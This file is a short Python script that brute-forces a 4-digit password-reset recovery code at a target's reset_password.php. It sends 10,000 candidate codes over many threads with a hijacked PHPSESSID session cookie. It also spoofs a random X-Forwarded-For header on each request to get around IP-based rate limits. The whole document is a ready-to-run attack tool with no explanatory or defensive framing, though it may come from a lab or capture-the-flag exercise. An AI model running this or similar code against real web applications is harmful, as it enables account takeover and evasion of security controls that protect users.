import requests
import random
import argparse
from concurrent.futures import ThreadPoolExecutor, as_completed

# Parse command-line arguments
parser = argparse.ArgumentParser(description="Brute-force 4-digit recovery code")
parser.add_argument("-ip", "--ip", required=True, help="Target IP address")
parser.add_argument("-p", "--port", required=True, help="Target port")
parser.add_argument("-SID", "--session_id", required=True, help="PHPSESSID value")
parser.add_argument("-t", "--threads", type=int, default=50, help="Number of threads")
args = parser.parse_args()
s_list = []
URL = f"http://{args.ip}:{args.port}/reset_password.php"

HEADERS = {
    "User-Agent": "Mozilla/5.0",
    "Content-Type": "application/x-www-form-urlencoded",
    "Cookie": f"PHPSESSID={args.session_id}"
}

def random_ip():
    return ".".join(str(random.randint(1, 255)) for _ in range(4))

def try_code(code_str):
    HEADERS["X-Forwarded-For"] = random_ip()
    data = {
        "recovery_code": code_str,
        "s": "179"  # Replace if dynamic
    }
    try:
        r = requests.post(URL, headers=HEADERS, data=data, timeout=3)
        if "Invalid or expired recovery code!" not in r.text:
            return code_str
    except requests.RequestException:
        pass
    print(f"[-] Wrong code: {code_str}")
    return None

with ThreadPoolExecutor(max_workers=args.threads) as executor:
    futures = {executor.submit(try_code, f"{i:04d}"): i for i in range(10000)}
    for future in as_completed(futures):
        result = future.result()
        if result:
            print(f"[+][+][+][+][+][+][+] Found code: {result}")
            s_list.append(result)
            executor.shutdown(wait=False)
            break

for s in s_list:
    print(f"Success Code:{s}")
